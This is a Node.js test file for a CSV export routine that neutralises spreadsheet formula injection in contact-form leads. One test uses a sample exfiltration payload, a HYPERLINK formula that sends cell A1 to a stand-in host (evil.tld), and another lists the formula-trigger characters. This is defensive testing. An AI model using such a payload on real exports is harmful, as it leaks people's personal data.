/* node --test src/lib/  — no framework, nothing installed.

   Here because the apostrophe in csv.js looks like a typo and reads like one
   to whoever tidies this file next. It is the whole defence against a
   stranger's contact-form message running as a formula on the machine of
   whoever exports the leads. */

import { test } from "node:test";
import assert from "node:assert/strict";
import { toCSV } from "./csv.js";

const row = (over) => ({
  created_at: "2026-01-01T10:00:00Z", name: "A", phone: "9822041155",
  project: "rainflower", source: "contact", status: "New", message: "hello", ...over
});

/* The realistic payload: it steals a lead's phone number on one click.
   Asserted on the opening of the cell rather than the whole string, because
   the quotes inside it are legitimately doubled by the escaping. */
test("a formula in the message is neutralised", () => {
  const evil = '=HYPERLINK("https://evil.tld?d="&A1,"Open")';
  const out = toCSV([row({ message: evil })]);
  assert.ok(out.includes(`"'=HYPERLINK`), "a message starting with = must gain a leading apostrophe");
  assert.ok(!out.includes(',"=HYPERLINK'), "no cell may begin with a bare =");
});

test("every character Excel treats as a formula is caught", () => {
  for (const c of ["=", "+", "-", "@", "\t", "\r"]) {
    const out = toCSV([row({ name: `${c}danger` })]);
    assert.ok(out.includes(`"'${c}danger"`), `${JSON.stringify(c)} must be prefixed`);
  }
});

test("ordinary text is left alone", () => {
  const out = toCSV([row({ name: "Rohan Kulkarni" })]);
  assert.ok(out.includes('"Rohan Kulkarni"'));
  assert.ok(!out.includes("'Rohan"), "no stray apostrophe on safe values");
});

test("quotes and commas still survive", () => {
  const out = toCSV([row({ message: 'He said "yes", twice' })]);
  assert.ok(out.includes('"He said ""yes"", twice"'));
});
